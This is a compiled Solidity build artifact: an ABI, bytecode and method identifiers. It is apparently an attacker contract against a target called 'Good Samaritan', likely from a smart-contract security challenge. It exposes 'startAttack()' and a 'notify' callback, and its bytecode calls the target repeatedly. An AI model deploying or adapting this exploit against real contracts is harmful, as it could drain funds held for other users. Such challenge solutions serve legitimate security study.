{"abi":[{"type":"constructor","inputs":[{"name":"goodSamaritanAddr","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"notify","inputs":[{"name":"","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"startAttack","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506040516103b23803806103b2833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b61032c806100865f395ff3fe60806040526004361061002b575f3560e01c806377c00de01461003657806398d078b41461004c575f5ffd5b3661003257005b5f5ffd5b348015610041575f5ffd5b5061004a61006b565b005b348015610057575f5ffd5b5061004a6100663660046102b9565b6100e2565b5f5f9054906101000a90046001600160a01b03166001600160a01b031663251436386040518163ffffffff1660e01b81526004016020604051808303815f875af11580156100bb573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100df91906102d0565b50565b5f5f9054906101000a90046001600160a01b03166001600160a01b031663251436386040518163ffffffff1660e01b81526004016020604051808303815f875af1158015610132573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061015691906102d0565b505f5f9054906101000a90046001600160a01b03166001600160a01b031663251436386040518163ffffffff1660e01b81526004016020604051808303815f875af11580156101a7573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101cb91906102d0565b505f5f9054906101000a90046001600160a01b03166001600160a01b031663251436386040518163ffffffff1660e01b81526004016020604051808303815f875af115801561021c573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061024091906102d0565b505f5f9054906101000a90046001600160a01b03166001600160a01b031663251436386040518163ffffffff1660e01b81526004016020604051808303815f875af1158015610291573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102b591906102d0565b5050565b5f602082840312156102c9575f5ffd5b5035919050565b5f602082840312156102e0575f5ffd5b815180151581146102ef575f5ffd5b939250505056fea26469706673582212208bbe0871d2145e8955709459ee5bc43991ef73158f2ad433ef6d0b9231fa078364736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"notify(uint256)":"98d078b4","startAttack()":"77c00de0"},"id":0}